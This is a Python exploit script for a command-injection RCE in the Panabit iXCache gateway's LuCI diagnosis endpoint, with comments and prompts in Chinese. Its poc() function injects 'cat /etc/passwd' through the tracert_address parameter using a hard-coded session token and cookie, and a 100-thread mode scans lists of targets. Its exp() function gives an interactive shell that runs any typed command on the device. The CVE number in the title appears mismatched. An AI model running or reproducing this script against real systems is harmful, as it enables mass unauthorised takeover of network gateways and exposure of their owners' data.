# Panabit iXCache网关RCE漏洞CVE-2023-38646
import requests, sys, argparse, json, re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    banner = '''  
                                   author:MOYV  
'''
    print(banner)

def poc(target):
    payload = '/cgi-bin/luci/;stok=9ba3cc411c1cd8cf7773a2df4ec43d65/admin/diagnosis?diag=tracert&tracert_address=127.0.0.1%3Bcat+%2Fetc%2Fpasswd&seq=1'
    headers = {
        'User-Agent': 'Mozilla/5.0(WindowsNT10.0;Win64;x64;rv:109.0)Gecko/20100101Firefox/115.0',
        'Accept': '*/*',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip,deflate',
        'X-Requested-With': 'XMLHttpRequest',
        'DNT': '1',
        'Connection': 'close',
        'Cookie': 'sysauth=b0d95241b0651d5fbaac5de8dabd2110',
    }
    try:
        res = requests.get(url=target + payload, headers=headers, verify=False, timeout=5)
        if 'root' in res.text:
            print(f'[+]存在漏洞：{target}')
            with open('Panabit_result.txt', 'a', encoding='utf-8') as fp:
                fp.write(target + '\n')
                return True
        else:
            return False
    except Exception as e:
        return False


def exp(target):
    headers = {
        'User-Agent': 'Mozilla/5.0(WindowsNT10.0;Win64;x64;rv:109.0)Gecko/20100101Firefox/115.0',
        'Accept': '*/*',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip,deflate',
        'X-Requested-With': 'XMLHttpRequest',
        'DNT': '1',
        'Connection': 'close',
        'Cookie': 'sysauth=b0d95241b0651d5fbaac5de8dabd2110',
    }
    while True:
        cmd = input("请输入执行的命令:")
        if cmd == "q":
            exit()
        payload = '/cgi-bin/luci/;stok=9ba3cc411c1cd8cf7773a2df4ec43d65/admin/diagnosis?diag=tracert&tracert_address=127.0.0.1%3B' + cmd + '&seq=1'
        res2 = requests.post(url=target + payload, headers=headers, verify=False)
        print(res2.text)

def main():
    banner()
    parse = argparse.ArgumentParser(description="Panabit iXCache网关RCE漏洞CVE-2023-38646脚本")
    parse.add_argument("-u", "--url", dest="url", type=str, help="Please enter url")
    parse.add_argument("-f", "--file", dest="file", type=str, help="Please enter file")
    args = parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, "r", encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n", ""))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

if __name__ == "__main__":
    main()